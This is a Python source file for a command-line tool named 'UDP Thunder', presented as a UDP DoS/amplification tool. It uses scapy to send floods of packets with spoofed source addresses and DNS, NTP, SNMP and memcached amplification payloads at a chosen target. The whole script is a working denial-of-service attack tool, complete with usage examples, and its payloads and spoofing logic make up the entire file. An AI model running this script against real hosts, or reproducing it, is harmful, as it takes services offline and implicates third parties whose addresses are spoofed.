#!/usr/bin/env python3
from scapy.all import *
from termcolor import colored
import pyfiglet
import colorama
import argparse
import random
import time
import sys

# Initialize colorama
colorama.init()

# Banner
def print_banner():
    banner = pyfiglet.figlet_format("UDP THUNDER", font="slant")
    print(colored(banner, "cyan"))
    print(colored("Made by Aryan Giri\n", "yellow"))

# Parse arguments
def parse_args():
    parser = argparse.ArgumentParser(
        description="UDP DoS/Amplification Tool",
        epilog=colored("Examples:\n"
                     "  python3 udp_thunder.py -t 10.0.0.1 -P dns -c 500\n"
                     "  python3 udp_thunder.py -t 10.0.0.1 -P ntp -s 192.168.1.1 -c 200 -v -T 1", "green"),
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=53, help="Target port (default: 53 for DNS)")
    parser.add_argument("-s", "--spoof", help="Spoof source IP (default: random)")
    parser.add_argument("-c", "--count", type=int, default=100, help="Number of packets to send (default: 100)")
    parser.add_argument("-P", "--protocol", choices=["dns", "ntp", "snmp", "memcached"], default="dns",
                       help="Amplification protocol (default: DNS)")
    parser.add_argument("-T", "--time", type=float, default=0.01,
                       help="Delay between packets in seconds (default: 0.01)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

# Craft UDP packets
def craft_packet(target, port, spoof_ip=None, protocol="dns"):
    if spoof_ip is None:
        spoof_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

    if protocol == "dns":
        payload = DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
    elif protocol == "ntp":
        payload = Raw(b"\x17\x00\x03\x2a" + b"\x00" * 48)
    elif protocol == "snmp":
        payload = Raw(b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00")
    elif protocol == "memcached":
        payload = Raw(b"\x00\x00\x00\x00\x00\x01\x00\x00get test\r\n")
    else:
        payload = Raw(b"UDP Thunder Test")

    packet = IP(src=spoof_ip, dst=target) / UDP(sport=RandShort(), dport=port) / payload
    return packet

# Main attack loop
def udp_thunder(target, port, spoof_ip, count, protocol, delay, verbose):
    print(colored(f"\n[*] Starting UDP Thunder attack on {target}:{port}", "green"))
    print(colored(f"[*] Protocol: {protocol.upper()}", "green"))
    print(colored(f"[*] Spoofed IP: {spoof_ip if spoof_ip else 'Random'}", "green"))
    print(colored(f"[*] Packets to send: {count}", "green"))
    print(colored(f"[*] Delay between packets: {delay} seconds\n", "green"))

    for i in range(1, count + 1):
        packet = craft_packet(target, port, spoof_ip, protocol)
        send(packet, verbose=0)
        if verbose:
            print(colored(f"[+] Sent packet {i}/{count}", "yellow"))
        time.sleep(delay)

    print(colored("\n[!] Attack complete!", "red"))

def main():
    print_banner()
    args = parse_args()
    udp_thunder(args.target, args.port, args.spoof, args.count, args.protocol, args.time, args.verbose)

if __name__ == "__main__":
    main()
